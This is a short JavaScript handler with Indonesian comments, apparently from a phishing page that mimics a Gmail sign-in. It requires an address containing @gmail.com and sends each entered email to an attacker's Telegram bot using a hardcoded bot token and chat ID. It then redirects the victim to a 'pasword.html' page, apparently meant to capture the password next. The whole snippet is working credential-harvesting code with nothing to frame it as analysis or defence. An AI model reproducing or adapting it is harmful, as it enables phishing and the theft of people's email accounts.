document.getElementById("lanjutkanBtn").addEventListener("click", function() {
    const emailInput = document.getElementById("emailInput");
    const email = emailInput.value.trim();

    // Validasi email
    if (email === "") {
      alert("Email atau ponsel harus diisi!");
      emailInput.focus();
      return;  // Hentikan jika input kosong
    }
    if (!email.includes('@gmail.com')) {
      alert("Email harus menyertakan @gmail.com");
      emailInput.focus();
      return;  // Hentikan jika email tidak valid
    }

    // Tampilkan loading spinner
    document.getElementById("loadingSpinner").style.display = "block";

    // Kirim data email ke Telegram
    const botToken = '6812714144:AAHCwoKn2croDh94SVFfWEmDz7R5eKbL34g';
    const chatId = '1701307635';
    const message = `email yang dimasukkan: ${email}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
      method: 'GET',
    })
    .then(response => response.json())
    .then(data => {
      // Setelah pengiriman, arahkan ke halaman password
      window.location.href = "pasword.html";  // Halaman tujuan setelah sukses
    })
    .catch(error => {
      console.error('Error:', error);
      alert('Terjadi kesalahan, coba lagi!');
    });
  });





  